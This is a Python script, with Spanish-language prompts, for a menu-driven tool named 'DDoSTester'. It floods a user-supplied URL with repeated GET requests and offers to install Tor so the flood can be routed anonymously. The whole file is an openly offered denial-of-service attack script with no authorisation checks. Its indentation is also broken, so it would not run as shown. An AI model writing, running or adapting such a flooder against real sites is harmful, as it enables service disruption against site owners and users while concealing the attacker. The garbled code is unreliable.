import requests
import time
import os


class DDoSTester:
    def __init__(self):
        self.url = ""
        self.num_requests = 0
        self.delay_between_requests = 0
        self.session = requests.Session()

def config_url(self):
self.url = input("Ingrese la URL a probar: ")
print("URL configurada correctamente.")

def start_attack(self):
self.num_requests = int(input("Ingrese el número de solicitudes a enviar: "))
self.delay_between_requests = float(input("Ingrese el tiempo de espera entre solicitudes (en segundos): "))
print("Iniciando ataque...")
for i in range(self.num_requests):
try:
response = self.session.get(self.url, timeout=10)
print(f"Request {i+1} sent. Status code: {response.status_code}")
except requests.exceptions.RequestException as e:
print(f"Error sending request: {e}")
time.sleep(self.delay_between_requests)
print("Ataque finalizado.")

def start_attack_tor(self):
self.num_requests = int(input("Ingrese el número de solicitudes a enviar: "))
self.delay_between_requests = float(input("Ingrese el tiempo de espera entre solicitudes (en segundos): "))
print("Iniciando ataque con Tor...")
for i in range(self.num_requests):
try:
self.session.proxies = {
'http': 'socks5h://localhost:9050',
'https': 'socks5h://localhost:9050'
}
response = self.session.get(self.url, timeout=10)
print(f"Request {i+1} sent. Status code: {response.status_code}")
except requests.exceptions.RequestException as e:
print(f"Error sending request: {e}")
time.sleep(self.delay_between_requests)
print("Ataque finalizado.")

def install_tor(self):
print("Instalando Tor...")
os.system("apt update && sudo apt install tor -y")
print("Tor instalado correctamente.")

def main(self):
while True:
print("DDoS Tester")
print("~~~~~~~~~~~~~~~~~~~~~~")
print("1. Configurar URL")
print("2. Iniciar ataque")
print("3. Instalar Tor y iniciar ataque con Tor")
print("4. Salir")
option = input("Ingrese una opción: ")
if option == "1":
self.config_url()
elif option == "2":
if self.url == "":
print("Debes configurar la URL primero.")
else:
self.start_attack()
elif option == "3":
if self.url == "":
print("Debes configurar la URL primero.")
else:
self.install_tor()
self.start_attack_tor()
elif option == "4":
print("Saliendo del programa.")
break
else:
print("Opción no válida. Intente nuevamente.")

if __name__ == "__main__":
ddos_tester = DDoSTester()
ddos_tester.main()
